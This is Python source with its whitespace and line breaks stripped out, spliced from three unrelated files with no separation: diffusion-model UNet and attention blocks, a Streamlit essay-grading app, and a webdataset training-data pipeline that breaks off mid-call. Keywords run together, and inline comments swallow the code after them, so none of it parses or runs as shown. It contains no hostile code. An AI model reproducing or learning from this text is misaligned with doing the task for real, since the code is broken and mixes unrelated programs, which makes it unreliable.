_channels:thenumberoftimestepembeddingchannels.:paramdropout:therateofdropout.:paramout_channels:ifspecified,thenumberofoutchannels.:paramuse_conv:ifTrueandout_channelsisspecified,useaspatialconvolutioninsteadofasmaller1x1convolutiontochangethechannelsintheskipconnection.:paramdims:determinesifthesignalis1D,2D,or3D.:paramuse_checkpoint:ifTrue,usegradientcheckpointingonthismodule.:paramup:ifTrue,usethisblockforupsampling.:paramdown:ifTrue,usethisblockfordownsampling."""def__init__(self,channels:int,emb_channels:int,dropout:float,out_channels:Optional[int]=None,use_conv:bool=False,use_scale_shift_norm:bool=False,dims:int=2,use_checkpoint:bool=False,up:bool=False,down:bool=False,kernel_size:int=3,exchange_temb_dims:bool=False,skip_t_emb:bool=False,):super().__init__()self.channels=channelsself.emb_channels=emb_channelsself.dropout=dropoutself.out_channels=out_channelsorchannelsself.use_conv=use_convself.use_checkpoint=use_checkpointself.use_scale_shift_norm=use_scale_shift_normself.exchange_temb_dims=exchange_temb_dimsifisinstance(kernel_size,Iterable):padding=[k//2forkinkernel_size]else:padding=kernel_size//2self.in_layers=nn.Sequential(normalization(channels),nn.SiLU(),conv_nd(dims,channels,self.out_channels,kernel_size,padding=padding),)self.updown=upordownifup:self.h_upd=Upsample(channels,False,dims)self.x_upd=Upsample(channels,False,dims)elifdown:self.h_upd=Downsample(channels,False,dims)self.x_upd=Downsample(channels,False,dims)else:self.h_upd=self.x_upd=nn.Identity()self.skip_t_emb=skip_t_embself.emb_out_channels=(2*self.out_channelsifuse_scale_shift_normelseself.out_channels)ifself.skip_t_emb:logpy.info(f"Skippingtimestepembeddingin{self.__class__.__name__}")assertnotself.use_scale_shift_normself.emb_layers=Noneself.exchange_temb_dims=Falseelse:self.emb_layers=nn.Sequential(nn.SiLU(),linear(emb_channels,self.emb_out_channels,),)self.out_layers=nn.Sequential(normalization(self.out_channels),nn.SiLU(),nn.Dropout(p=dropout),zero_module(conv_nd(dims,self.out_channels,self.out_channels,kernel_size,padding=padding,)),)ifself.out_channels==channels:self.skip_connection=nn.Identity()elifuse_conv:self.skip_connection=conv_nd(dims,channels,self.out_channels,kernel_size,padding=padding)else:self.skip_connection=conv_nd(dims,channels,self.out_channels,1)defforward(self,x:th.Tensor,emb:th.Tensor)->th.Tensor:"""ApplytheblocktoaTensor,conditionedonatimestepembedding.:paramx:an[NxCx...]Tensoroffeatures.:paramemb:an[Nxemb_channels]Tensoroftimestepembeddings.:return:an[NxCx...]Tensorofoutputs."""ifself.use_checkpoint:returncheckpoint(self._forward,x,emb)else:returnself._forward(x,emb)def_forward(self,x:th.Tensor,emb:th.Tensor)->th.Tensor:ifself.updown:in_rest,in_conv=self.in_layers[:-1],self.in_layers[-1]h=in_rest(x)h=self.h_upd(h)x=self.x_upd(x)h=in_conv(h)else:h=self.in_layers(x)ifself.skip_t_emb:emb_out=th.zeros_like(h)else:emb_out=self.emb_layers(emb).type(h.dtype)whilelen(emb_out.shape)<len(h.shape):emb_out=emb_out[...,None]ifself.use_scale_shift_norm:out_norm,out_rest=self.out_layers[0],self.out_layers[1:]scale,shift=th.chunk(emb_out,2,dim=1)h=out_norm(h)*(1+scale)+shifth=out_rest(h)else:ifself.exchange_temb_dims:emb_out=rearrange(emb_out,"btc...->bct...")h=h+emb_outh=self.out_layers(h)returnself.skip_connection(x)+hclassAttentionBlock(nn.Module):"""Anattentionblockthatallowsspatialpositionstoattendtoeachother.Originallyportedfromhere,butadaptedtotheN-dcase.https://github.com/hojonathanho/diffusion/blob/1e0dceb3b3495bbe19116a5e1b3596cd0706c543/diffusion_tf/models/unet.py#L66."""def__init__(self,channels:int,num_heads:int=1,num_head_channels:int=-1,use_checkpoint:bool=False,use_new_attention_order:bool=False,):super().__init__()self.channels=channelsifnum_head_channels==-1:self.num_heads=num_headselse:assert(channels%num_head_channels==0),f"q,k,vchannels{channels}isnotdivisiblebynum_head_channels{num_head_channels}"self.num_heads=channels//num_head_channelsself.use_checkpoint=use_checkpointself.norm=normalization(channels)self.qkv=conv_nd(1,channels,channels*3,1)ifuse_new_attention_order:#splitqkvbeforesplitheadsself.attention=QKVAttention(self.num_heads)else:#splitheadsbeforesplitqkvself.attention=QKVAttentionLegacy(self.num_heads)self.proj_out=zero_module(conv_nd(1,channels,channels,1))defforward(self,x:th.Tensor,**kwargs)->th.Tensor:returncheckpoint(self._forward,x)def_forward(self,x:th.Tensor)->th.Tensor:b,c,*spatial=x.shapex=x.reshape(b,c,-1)qkv=self.qkv(self.norm(x))h=self.attention(qkv)h=self.proj_out(h)return(x+h).reshape(b,c,*spatial)classQKVAttentionLegacy(nn.Module):"""AmodulewhichperformsQKVattention.MatcheslegacyQKVAttention+input/ouputheadsshaping"""def__init__(self,n_heads:int):super().__init__()self.n_heads=n_headsdefforward(self,qkv:th.Tensor)->th.Tensor:"""ApplyQKVattention.:paramqkv:an[Nx(H*3*C)xT]tensorofQs,Ks,andVs.:return:an[Nx(H*C)xT]tensorafterattention."""bs,width,length=qkv.shapeassertwidth%(3*self.n_heads)==0ch=width//(3*self.n_heads)q,k,v=qkv.reshape(bs*self.n_heads,ch*3,length).split(ch,dim=1)scale=1/math.sqrt(math.sqrt(ch))weight=th.einsum("bct,bcs->bts",q*scale,k*scale)#Morestablewithf16thandividingafterwardsweight=th.softmax(weight.float(),dim=-1).type(weight.dtype)a=th.einsum("bts,bcs->bct",weight,v)returna.reshape(bs,-1,length)classQKVAttention(nn.Module):"""AmodulewhichperformsQKVattentionandsplitsinadifferentorder."""def__init__(self,n_heads:int):super().__init__()self.n_heads=n_headsdefforward(self,qkv:th.Tensor)->th.Tensor:"""ApplyQKVattention.:paramqkv:an[Nx(3*H*C)xT]tensorofQs,Ks,andVs.:return:an[Nx(H*C)xT]tensorafterattention."""bs,width,length=qkv.shapeassertwidth%(3*self.n_heads)==0ch=width//(3*self.n_heads)q,k,v=qkv.chunk(3,dim=1)scale=1/math.sqrt(math.sqrt(ch))weight=th.einsum("bct,bcs->bts",(q*scale).view(bs*self.n_heads,ch,length),(k*scale).view(bs*self.n_heads,ch,length),)#Morestablewithf16thandividingafterwardsweight=th.softmax(weight.float(),dim=-1).type(weight.dtype)a=th.einsum("bts,bcs->bct",weight,v.reshape(bs*self.n_heads,ch,length))returna.reshape(bs,-1,length)classTimestep(nn.Module):def__init__(self,dim:int):super().__init__()self.dim=dimdefforward(self,t:th.Tensor)->th.Tensor:returntimestep_embedding(t,self.dim)classUNetModel(nn.Module):"""ThefullUNetmodelwithattentionandtimestepembedding.:paramin_channels:channelsintheinputTensor.:parammodel_channels:basechannelcountforthemodel.:paramout_channels:channelsintheoutputTensor.:paramnum_res_blocks:numberofresidualblocksperdownsample.:paramattention_resolutions:acollectionofdownsampleratesatwhichattentionwilltakeplace.Maybeaset,list,ortuple.Forexample,ifthiscontains4,thenat4xdownsampling,attentionwillbeused.:paramdropout:thedropoutprobability.:paramchannel_mult:channelmultiplierforeachleveloftheUNet.:paramconv_resample:ifTrue,uselearnedconvolutionsforupsamplinganddownsampling.:paramdims:determinesifthesignalis1D,2D,or3D.:paramnum_classes:ifspecified(asanint),thenthismodelwillbeclass-conditionalwith`num_classes`classes.:paramuse_checkpoint:usegradientcheckpointingtoreducememoryusage.:paramnum_heads:thenumberofattentionheadsineachattentionlayer.:paramnum_heads_channels:ifspecified,ignorenum_headsandinsteaduseafixedchannelwidthperattentionhead.:paramnum_heads_upsample:workswithnum_headstosetadifferentnumberofheadsforupsampling.Deprecated.:paramuse_scale_shift_norm:useaFiLM-likeconditioningmechanism.:paramresblock_updown:useresidualblocksforup/downsampling.:paramuse_new_attention_order:useadifferentattentionpatternforpotentiallyincreasedefficiency."""def__init__(self,in_channels:int,model_channels:int,out_channels:int,num_res_blocks:int,attention_resolutions:int,dropout:float=0.0,channel_mult:Union[List,Tuple]=(1,2,4,8),conv_resample:bool=True,dims:int=2,num_classes:Optional[Union[int,str]]=None,use_checkpoint:bool=False,num_heads:int=-1,num_head_channels:int=-1,num_heads_upsample:int=-1,use_scale_shift_norm:bool=False,resblock_updown:bool=False,transformer_depth:int=1,context_dim:Optional[int]=None,disable_self_attentions:Optional[List[bool]]=None,num_attention_blocks:Optional[List[int]]=None,disable_middle_self_attn:bool=False,disable_middle_transformer:bool=False,use_linear_in_transformer:bool=False,spatial_transformer_attn_type:str="softmax",adm_in_channels:Optional[int]=None,):super().__init__()ifnum_heads_upsample==-1:num_heads_upsample=num_headsifnum_heads==-1:assert(num_head_channels!=-1),"Eithernum_headsornum_head_channelshastobeset"ifnum_head_channels==-1:assert(num_heads!=-1),"Eithernum_headsornum_head_channelshastobeset"self.in_channels=in_channelsself.model_channels=model_channelsself.out_channels=out_channelsifisinstance(transformer_depth,int):transformer_depth=len(channel_mult)*[transformer_depth]transformer_depth_middle=transformer_depth[-1]ifisinstance(num_res_blocks,int):self.num_res_blocks=len(channel_mult)*[num_res_blocks]else:iflen(num_res_blocks)!=len(channel_mult):raiseValueError("providenum_res_blockseitherasanint(globallyconstant)or""asalist/tuple(per-level)withthesamelengthaschannel_mult")self.num_res_blocks=num_res_blocksifdisable_self_attentionsisnotNone:assertlen(disable_self_attentions)==len(channel_mult)ifnum_attention_blocksisnotNone:assertlen(num_attention_blocks)==len(self.num_res_blocks)assertall(map(lambdai:self.num_res_blocks[i]>=num_attention_blocks[i],range(len(num_attention_blocks)),))logpy.info(f"ConstructorofUNetModelreceivednum_attention_blocks={num_attention_blocks}."f"ThisoptionhasLESSprioritythanattention_resolutions{attention_resolutions},"f"i.e.,incaseswherenum_attention_blocks[i]>0but2**inotinattention_resolutions,"f"attentionwillstillnotbeset.")self.attention_resolutions=attention_resolutionsself.dropout=dropoutself.channel_mult=channel_multself.conv_resample=conv_resampleself.num_classes=num_classesself.use_checkpoint=use_checkpointself.num_heads=num_headsself.num_head_channels=num_head_channelsself.num_heads_upsample=num_heads_upsampletime_embed_dim=model_channels*4self.time_embed=nn.Sequential(linear(model_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,time_embed_dim),)ifself.num_classesisnotNone:ifisinstance(self.num_classes,int):self.label_emb=nn.Embedding(num_classes,time_embed_dim)elifself.num_classes=="continuous":logpy.info("settinguplinearc_admembeddinglayer")self.label_emb=nn.Linear(1,time_embed_dim)elifself.num_classes=="timestep":self.label_emb=nn.Sequential(Timestep(model_channels),nn.Sequential(linear(model_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,time_embed_dim),),)elifself.num_classes=="sequential":assertadm_in_channelsisnotNoneself.label_emb=nn.Sequential(nn.Sequential(linear(adm_in_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,time_embed_dim),))else:raiseValueErrorself.input_blocks=nn.ModuleList([TimestepEmbedSequential(conv_nd(dims,in_channels,model_channels,3,padding=1))])self._feature_size=model_channelsinput_block_chans=[model_channels]ch=model_channelsds=1forlevel,multinenumerate(channel_mult):fornrinrange(self.num_res_blocks[level]):layers=[ResBlock(ch,time_embed_dim,dropout,out_channels=mult*model_channels,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,)]ch=mult*model_channelsifdsinattention_resolutions:ifnum_head_channels==-1:dim_head=ch//num_headselse:num_heads=ch//num_head_channelsdim_head=num_head_channelsifcontext_dimisnotNoneandexists(disable_self_attentions):disabled_sa=disable_self_attentions[level]else:disabled_sa=Falseif(notexists(num_attention_blocks)ornr<num_attention_blocks[level]):layers.append(SpatialTransformer(ch,num_heads,dim_head,depth=transformer_depth[level],context_dim=context_dim,disable_self_attn=disabled_sa,use_linear=use_linear_in_transformer,attn_type=spatial_transformer_attn_type,use_checkpoint=use_checkpoint,))self.input_blocks.append(TimestepEmbedSequential(*layers))self._feature_size+=chinput_block_chans.append(ch)iflevel!=len(channel_mult)-1:out_ch=chself.input_blocks.append(TimestepEmbedSequential(ResBlock(ch,time_embed_dim,dropout,out_channels=out_ch,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,down=True,)ifresblock_updownelseDownsample(ch,conv_resample,dims=dims,out_channels=out_ch)))ch=out_chinput_block_chans.append(ch)ds*=2self._feature_size+=chifnum_head_channels==-1:dim_head=ch//num_headselse:num_heads=ch//num_head_channelsdim_head=num_head_channelsself.middle_block=TimestepEmbedSequential(ResBlock(ch,time_embed_dim,dropout,out_channels=ch,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,),SpatialTransformer(ch,num_heads,dim_head,depth=transformer_depth_middle,context_dim=context_dim,disable_self_attn=disable_middle_self_attn,use_linear=use_linear_in_transformer,attn_type=spatial_transformer_attn_type,use_checkpoint=use_checkpoint,)ifnotdisable_middle_transformerelseth.nn.Identity(),ResBlock(ch,time_embed_dim,dropout,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,),)self._feature_size+=chself.output_blocks=nn.ModuleList([])forlevel,multinlist(enumerate(channel_mult))[::-1]:foriinrange(self.num_res_blocks[level]+1):ich=input_block_chans.pop()layers=[ResBlock(ch+ich,time_embed_dim,dropout,out_channels=model_channels*mult,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,)]ch=model_channels*multifdsinattention_resolutions:ifnum_head_channels==-1:dim_head=ch//num_headselse:num_heads=ch//num_head_channelsdim_head=num_head_channelsifexists(disable_self_attentions):disabled_sa=disable_self_attentions[level]else:disabled_sa=Falseif(notexists(num_attention_blocks)ori<num_attention_blocks[level]):layers.append(SpatialTransformer(ch,num_heads,dim_head,depth=transformer_depth[level],context_dim=context_dim,disable_self_attn=disabled_sa,use_linear=use_linear_in_transformer,attn_type=spatial_transformer_attn_type,use_checkpoint=use_checkpoint,))iflevelandi==self.num_res_blocks[level]:out_ch=chlayers.append(ResBlock(ch,time_embed_dim,dropout,out_channels=out_ch,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,up=True,)ifresblock_updownelseUpsample(ch,conv_resample,dims=dims,out_channels=out_ch))ds//=2self.output_blocks.append(TimestepEmbedSequential(*layers))self._feature_size+=chself.out=nn.Sequential(normalization(ch),nn.SiLU(),zero_module(conv_nd(dims,model_channels,out_channels,3,padding=1)),)defforward(self,x:th.Tensor,timesteps:Optional[th.Tensor]=None,context:Optional[th.Tensor]=None,y:Optional[th.Tensor]=None,**kwargs,)->th.Tensor:"""Applythemodeltoaninputbatch.:paramx:an[NxCx...]Tensorofinputs.:paramtimesteps:a1-Dbatchoftimesteps.:paramcontext:conditioningpluggedinviacrossattn:paramy:an[N]Tensoroflabels,ifclass-conditional.:return:an[NxCx...]Tensorofoutputs."""assert(yisnotNone)==(self.num_classesisnotNone),"mustspecifyyifandonlyifthemodelisclass-conditional"hs=[]t_emb=timestep_embedding(timesteps,self.model_channels,repeat_only=False)emb=self.time_embed(t_emb)ifself.num_classesisnotNone:asserty.shape[0]==x.shape[0]emb=emb+self.label_emb(y)h=xformoduleinself.input_blocks:h=module(h,emb,context)hs.append(h)h=self.middle_block(h,emb,context)formoduleinself.output_blocks:h=th.cat([h,hs.pop()],dim=1)h=module(h,emb,context)h=h.type(x.dtype)returnself.out(h)fromstatisticsimportmeanimportnltkfromnltk.tokenizeimportRegexpTokenizerfromnltk.corpusimportstopwordsfromessaygrader.process.averageWordLengthimportaverageWordLengthfromessaygrader.process.misspellingsimportnmisspelledfromessaygrader.process.wordcountimportlengthfromessaygrader.process.averageSentenceLengthimportaverageSentenceLengthfromessaygrader.process.grammarcheckerimportgrammarCheckfromessaygrader.process.keywordsimportkeyWordsfromessaygrader.process.sentcountimportsentcountfromessaygrader.process.vocabularyimportVocabCounterfromessaygrader.process.stopwordsimportstopWordsfromegimportessaygraderimportstreamlitasstimportpandasaspdnltk.download('all')st.title('AutomatedEssayGrader')grade=st.radio('EssayType',['MiddleSchool','HighSchool'])topic=st.radio('Whatkindofessaydidyouwrite?',['SourceDependent','Persuasive/Narrative/Expository'])prompt=st.text_input('EssayPrompt')essay=st.text_area('Essay')defcleanEssay(essay):essays=[essay]tokenizer=RegexpTokenizer(r'\w+')cleanedessay=tokenizer.tokenize(essay)essays.append(cleanedessay)stop_words=set(stopwords.words('english'))cleanedessay_nosw=[wforwincleanedessayifnotw.lower()instop_words]essays.append(cleanedessay_nosw)returnessaysdefmakeFeatures(essays,prompt):essay=essays[0]cleanedessay=essays[1]cleanedessay_nosw=essays[2]features=[]features.append(averageWordLength(cleanedessay))features.append(nmisspelled(cleanedessay))features.append(length(cleanedessay))features.append(keyWords(prompt,cleanedessay_nosw))features.append(sentcount(essay))features.append(evaluate(cleanedessay))features.append(stopWords(cleanedessay))features.append(vocabulary(cleanedessay))row=pd.DataFrame([features],columns=['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words','vocabulary'])returnrowdefevaluate(essay):emote=pd.read_excel('essaygrader/data/pastData/emote.xlsx')points=0forwordinessay:word=word.lower()ifword.lower()inemote['word'].unique():bnoun=emote[emote['word']==word]['noun'].values[0]if(bnoun):points+=mean(emote[emote['word']==word][['ndim'+str(i)foriinrange(1,8)]].values[0])else:points+=mean(emote[emote['word']==word][['adim'+str(i)foriinrange(1,11)]].values[0])returnpointsdefvocabulary(li):vocab=VocabCounter()returnround(vocab.CountVocab(li)*100,2)ifst.button('Submit'):essays=cleanEssay(essay)row=makeFeatures(essays,prompt)grader=essaygrader(grade,topic,row)answer=grader.gradeEssay()prediction=answer[0:25]feedback=answer[25:]st.write(prediction)st.write(feedback)importimportlibimportosfromtypingimportCallable,Optional,Union,List,Any,DictimportrefrompackagingimportversionfromoperatorimportitemgetterimportfunctoolsimporttimeimportwarningsimportthreadingfromomegaconfimportListConfig,DictConfigimporttorchdataimporttorch.distributedasdistfromtorch.utils.data.datapipes.iterimportIterableWrapper,FileOpenerfromtorchdata.datapipes.iterimportIterKeyZipperimportwebdatasetaswdsfrom.custom_datapipesimport(CustomShardExpanderIterDataPipe,SplitByWorker,PrefixResampler,TarArchiveLoaderAndCloser,SeedSetter,Dataset2SamplesConverter,_is_stream_handle,)classTimeoutError(Exception):passdeftimeout_wrapper(func):defwrapper(*args,**kwargs):if("SDATA_MAX_EXC_TIME"notinos.environornotos.environ["SDATA_MAX_EXC_TIME"]):res=func(*args,**kwargs)delargsdelkwargsreturnrestimeout=float(os.environ["SDATA_MAX_EXC_TIME"])result=[None]exception=[None]event=threading.Event()defwrapped_func():try:result[0]=func(*args,**kwargs)exceptExceptionase:exception[0]=efinally:event.set()thread=threading.Thread(target=wrapped_func)thread.start()event.wait(timeout)ifnotevent.is_set():raiseTimeoutError(f"Functioncalltimedout(longerthan{timeout}secs).")thread.join()ifexception[0]isnotNone:raiseexception[0]delthreaddelexceptiondelwrapped_funcdeleventdelargsdelkwargsreturnresult[0]returnwrapperdefwarn_and_continue(exn):"""Callinanexceptionhandlertoignoreanyexception,isssueawarning,andcontinue."""print(exn)warnings.warn(repr(exn))time.sleep(0.05)returnTruedeftime_measure(name:str="function"):defwrapper(fn):defmeasure_time(*args,**kwargs):start=time.perf_counter()r=fn(*args,**kwargs)end=time.perf_counter()if"SDATA_PROFILE"inos.environandos.environ["SDATA_PROFILE"]:ifrisNone:returnrtry:ifisinstance(r,Dict):r[f"{name}-time"]=end-startelse:args[1][f"{name}-time"]=end-startexceptExceptionase:print(f"Exceptionraisedwhenmeasuringtimefor{name}")raiseedelargsdelkwargsreturnrreturnmeasure_timereturnwrapperdefinstantiate(config:Union[Dict,DictConfig])->Any:ifnot"target"inconfig:ifconfig=="__is_first_stage__":returnNoneelifconfig=="__is_unconditional__":returnNoneraiseKeyError("Expectedkey`target`toinstantiate.")returncreate_obj(config["target"])(**config.get("params",dict()))defmake_callable(config):returnfunctools.partial(create_obj(config["target"]),**config.get("params",dict()))defcreate_obj(string:str,reload:bool=False,invalidate_cache:bool=True)->Any:module,cls=string.rsplit(".",1)ifinvalidate_cache:importlib.invalidate_caches()ifreload:module_imp=importlib.import_module(module)importlib.reload(module_imp)returngetattr(importlib.import_module(module,package=None),cls)classKeyPassThroughDecoder(wds.Decoder):def__init__(self,*args,passthrough_keys=None,**kwargs):super().__init__(*args,**kwargs)self.passthrough_keys=passthrough_keysifself.passthrough_keysisNone:self.passthrough_keys=[]defdecode1(self,key,data):#ifdataisastreamhandle,weneedtoreadallthecontentbeforedecodingif_is_stream_handle(data):ds=data#Thebehaviorof.readcandifferbetweenstreams(e.g.HTTPResponse),hencethisisusedinsteaddata=b"".join(data)ds.close()key="."+keyforfinself.handlers:result=f(key,data)ifisinstance(result,wds.autodecode.Continue):key,data=result.key,result.datacontinueifresultisnotNone:deldatareturnresultreturndata@timeout_wrapper@time_measure(name="KeyPassThroughDecoder")defdecode(self,sample):"""Decodeanentiresample.:paramsample:thesample,adictionaryofkeyvaluepairs"""result={}assertisinstance(sample,dict),samplefork,vinlist(sample.items()):ifk[0]=="_":ifisinstance(v,bytes):v=v.decode("utf-8")result[k]=vcontinueifself.onlyisnotNoneandknotinself.only:result[k]=vcontinueassertvisnotNoneifself.partial:ifisinstance(v,bytes)orkinself.passthrough_keys:result[k]=self.decode1(k,v)else:result[k]=velse:assert(isinstance(v,bytes)orkinself.passthrough_keys),f"key:{k};passthrough_keys:{self.passthrough_keys}"result[k]=self.decode1(k,v)returnresultdeftarfilter(x):ret=x.endswith(".tar")delxreturnretdefgrouper(x):key=x[0].split("/")[-1].split(".")[0]delxreturnkeydeftuple_grouper(x):key=x[0][0].split("/")[-1].split(".")[0]delxreturnkeydefmerge_samples(s1,s2,meta_urls):s1_files=[os.path.splitext(s[0])[1]forsins1]meta_key_list=[mkformkinmeta_urlsifmkins2[0][0]]iflen(meta_key_list)==0:raiseValueError(f"nomatchingmetakeyfoundforthefollowingfile(s):{os.path.splitext(s2[0][0])[0]}")eliflen(meta_key_list)>1:raiseValueError(f"Morethanonematchingmetakeyfoundforthefollowingfile(s):{os.path.splitext(s2[0][0])[0]}")meta_key=meta_key_list[0]outs2=[sifos.path.splitext(s[0])[1]notins1_fileselse(os.path.splitext(s[0])[0]+meta_key+os.path.splitext(s[0])[1],s[1])forsins2]dels2returnlist(s1)+outs2defmerge_them(u1,u2):#concatlists:theselistsshouldcontainalltarfilesfromthesameprefixbut#withdifferentfilenamesreturnu1[1]+[u2,]defidentity(x):returnTruedefmap_to_tuple(x):return(os.path.join(os.path.split(x)[0],os.path.splitext(os.path.split(x)[1])[0]),[x,],)deffilter_with_meta_set(x,meta_set):returnitemgetter(0)(x)inmeta_setdefget_ref_key(x,suffix):returnos.path.splitext(x.replace("_"+suffix,""))[0]deflist_files_in_datapipe(urls:Union[List,ListConfig],is_braceexpand:bool,tar_sampler:Callable=identity,)->torchdata.datapipes.iter.IterDataPipe:""":paramdatapipe::paramis_braceexpand::return:"""datapipe=IterableWrapper(urls)ifversion.parse(torchdata.__version__)>=version.parse("0.6.0"):ifis_braceexpand:datapipe=CustomShardExpanderIterDataPipe(datapipe)else:datapipe=datapipe.list_files(recursive=True).filter(tarfilter)else:ifis_braceexpand:datapipe=CustomShardExpanderIterDataPipe(datapipe)else:datapipe=datapipe.list_files(recursive=True).filter(tarfilter)datapipe=datapipe.filter(tar_sampler)returndatapipeclassStableDataPipeline(wds.DataPipeline,wds.compat.FluidInterface):"""Centralclassforreadingdatafromtarsonlocalfsandbuildingsamplesbasedonconsecutivefileswiththesamekeys"""def__init__(self,urls:Union[List[str],str,ListConfig],meta_urls:Optional[Union[List[str],str]]=None,metadata_buffer_size:Union[int,None]=10000,repeat:int=None,shardshuffle:int=10000,sample_shuffle:int=1,resample_prefixes:bool=False,prefix_probs:Optional[List[float]]=None,split_data_by_worker:bool=True,tar_sampler:Optional[Union[DictConfig,Dict,Callable]]=identity,handler:Union[Callable,DictConfig]=wds.reraise_exception,debug:bool=False,n_shards:int=100000,):""":paramurls:folderstoloadtheshardsfrom,canbealistofdifferentprefoxesfordatasetmixing:parammeta_urls:canbeusedforalignedmetadatafilesstoredastars:parammetadata_buffer_size::paramrepeat:numberofrepetitionsinthetrainingdata.DefaultisNonewhichmeansloopingperpetually.:paramshardshuffle:Shufflebuffersizeforshardshuffling.size1meansnoshufflin.Defaultis10k.:paramsample_shuffle:Shufflebufferforsample-level-shuffling.Defaultis1whichmeansnoshuffling:paramresample_prefixes:Whethertoresamplewhendifferentprefixesareintheentiredataset.Thiscanbeusefulincombinationwithprefixprobswhentrainingonmergeddatasetsofnon-equalsize.:paramprefix_probs:listcontainingresamplingprobabilitiesforeveryprefixin`urls`:paramsplit_data_by_worker:Whethertosplitshardsacrossworkerthreadsfornum_workers>0:paramhandler:handlerforhandlingexceptionsasinwebdataset"""super().__init__()ifisinstance(urls,(List,ListConfig,list)):passelifisinstance(urls,str):urls=[urls]else:raiseTypeError("urlsneedtobepathtoaS3prefixorlistofpathstomorethanoneprefixes")ifisinstance(handler,(DictConfig,Dict)):handler=make_callable(handler)#getsomeinformationabtfswhereshardsliveinandthewayshardsarespecifiedis_braceexpand=any(["{"inuforuinurls])ifis_braceexpand:brace_expansion=re.compile(r"\{[0-9]+\.\.[0-9]+\}")assertall(len(re.findall(brace_expansion,u))==1foruinurls),("Specifiyingtarsinlistedprefixesshouldbeconsistent.""Itshouldbeeitherbraceexpandnotationorjustusingsome""baseprefix.Ifthisstillfails,youmighthavesomeurlswith""multipleormalformedbraceexpands.")ifisinstance(tar_sampler,(Dict,dict,DictConfig)):tar_sampler=instantiate(tar_sampler)main_datapipe=list_files_in_datapipe(urls,is_braceexpand=is_braceexpand,tar_sampler=tar_sampler,).map(fn=map_to_tuple)ifmeta_urls:print(f"Zippingtogether{len(meta_urls)}metadatapipeswiththefollowingsuffixes{meta_urls}"f"andaddingthistothemaindatapipes")ifisinstance(meta_urls,str):meta_urls=[meta_urls]meta_urls_base=[os.path.split(m)forminurls]#meta_urls=[[os.path.join(m[0],os.path.splitext(m[1])[0]+f"_{suffix}"+os.path.splitext(m[1])[1])forminmeta_urls_base]forsuffixinmeta_urls]meta_files=[[os.path.join(m[0]+f"_{suffix}",m[1])forminmeta_urls_base]forsuffixinmeta_urls]forsuffix,meta_url_collectioninzip(meta_urls,meta_files):#thisisthemetadatawhichwillbeaddedtothemandatameta_datapipe=list_files_in_datapipe(meta_url_collection,is_braceexpand=is_braceexpand,tar_sampler=tar_sampler,)#filteroutnon-exisitingshardsmeta_set=set([get_ref_key(pth,suffix)forpthinmeta_datapipe])main_datapipe=main_datapipe.filter(functools.partial(filter_with_meta_set,meta_set=meta_set))#cycleinsidebranchtoavoidexhaustingafteriteratingovertheentiredatasetmeta_datapipe=meta_datapipe.cycle()#mergingalwaysbasedonfilenameswherethemetadatashardsareexpectedtohave<main_shard_id>.tar,#e.g.foramainshard"0000.tar"andanopticalflowmetadatashardwe'dhave"0000.tar"forthemetadatashard#andtheresultingkeywouldbe/path/to/prefix/0000main_datapipe=IterKeyZipper(main_datapipe,ref_datapipe=meta_datapipe,key_fn=itemgetter(0),ref_key_fn=functools.partial(get_ref_key,suffix=suffix),keep_key=True,merge_fn=merge_them,buffer_size=metadata_buffer_size,)#main_datapipe=main_datapipe#startshufflingaccrossshardsforthefirsttimetomixdifferentdatasets#(canbethesameforallworkers,justasanadditionalshuffledinitialization)ifshardshuffle>1andnotresample_prefixesandlen(urls)>1:#backtodatapipes.Wefurtherapplyamaptoremovethekey,sothattheresultisthesamesthan#fortheprefixsubsamplermain_datapipe=main_datapipe.shuffle(buffer_size=n_shards).map(fn=itemgetter(1))elifresample_prefixes:main_datapipe=PrefixResampler(main_datapipe.shuffle(buffer_size=n_shards),ps=prefix_probs,prefixes=urls,is_braceexpand=is_braceexpand,custom_seeding=split_data_by_worker,debug=debug)else:main_datapipe=main_datapipe.map(itemgetter(1))ifnotresample_prefixes:shardshuffle=max(shardshuffle,1)main_datapipe=main_datapipe.shuffle(buffer_size=shardshuffle)main_datapipe=main_datapipe.sharding_filter()#afterthisoperationdatapipesinthedistinctprocessescontaindifferenttarsifdist.is_available()anddist.is_initialized():#afterthisoperationdatapipesinthedistinctprocessescontaindifferenttarsglobal_rank=dist.get_rank()world_size=dist.get_world_size()main_datapipe.apply_sharding(world_size,global_rank)print("#"*100)print(f"distributingshardsforworkerwithglobalrank{global_rank}")print("#"*100)else:print(f"torchdistributednotused,notapplyingshardingin{self.__class__.__name__}")ifsplit_data_by_worker:print("Distributingshardsacrosstheworkerthreadsineveryprocess")main_datapipe=SplitByWorker(datapipe=main_datapipe,debug=debug)else:main_datapipe=SeedSetter(main_datapipe,debug=debug)main_datapipe=main_datapipe.cycle(count=repeat)#unzipbeforeloading,sinceherewecanbesurethatallshardsaredistributedandshuffled#alignedwiththeircorrespondingmetadatashardsmeta_len=len(meta_urls)ifmeta_urlselse0main_datapipe,*meta_datapipes=main_datapipe.unzip(sequence_length=meta_len+1)#regularfileopenermain_datapipe=FileOpener(main_datapipe,mode="b")meta_datapipes=[FileOpener(m,mode="b")forminmeta_datapipes]#adaptedTarLoaderwhichclosesopentarfilehandlesafterexceedingthem#main_datapipe=TarArchiveLoaderAndCloser(datapipe=main_datapipe).groupby(grouper)#main_datapipe=TarArchiveLoaderAndCloser(datapipe=main_datapipe,handler=handler).groupby(grouper)meta_datapipes=[TarArchiveLoaderAndCloser(datapipe=m,handler=handler).groupby(grouper)forminmeta_datapipes]#zipagain,thistimewe'researchingbasedonthesamekeysformeta_dpinmeta_datapipes:#herewedamain_datapipe=IterKeyZipper(main_datapipe,ref_datapipe=meta_dp,key_fn=tuple_grouper,merge_fn=functools.partial(merge_samples,meta_urls=meta_urls),buffer_size=metadata_buffer_size,)ifsample_shuffle>0:main_datapipe=main_datapipe.shuffle(buffer_size=sample_shuffle)main_datapipe=Dataset2SamplesConverter(main_datapipe